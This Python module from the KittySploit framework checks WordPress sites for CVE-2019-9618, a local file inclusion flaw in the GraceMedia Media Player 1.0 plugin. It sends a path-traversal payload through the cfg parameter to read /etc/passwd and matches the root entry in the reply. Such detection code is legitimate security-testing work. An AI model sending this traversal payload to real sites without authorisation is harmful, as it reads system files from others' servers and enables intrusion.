#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress GraceMedia Media Player plugin 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress GraceMedia Media Player 1.0 - Local File Inclusion Detection',
        'description': 'WordPress GraceMedia Media Player plugin 1.0 is susceptible to local file inclusion via the cfg parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2019',
            'wordpress',
            'wp-plugin',
            'lfi',
            'seclists',
            'edb',
            'gracemedia_media_player_project',
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9618',
            'https://seclists.org/fulldisclosure/2019/Mar/26',
            'https://www.exploit-db.com/exploits/46537',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-9618',
            'http://seclists.org/fulldisclosure/2019/Mar/32',
        ],
        'cve': 'CVE-2019-9618',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code not in (200, 500):
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="WordPress GraceMedia Media Player 1.0 - Local File Inclusion detected",
                path='/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd',
            )
            return True
        return False

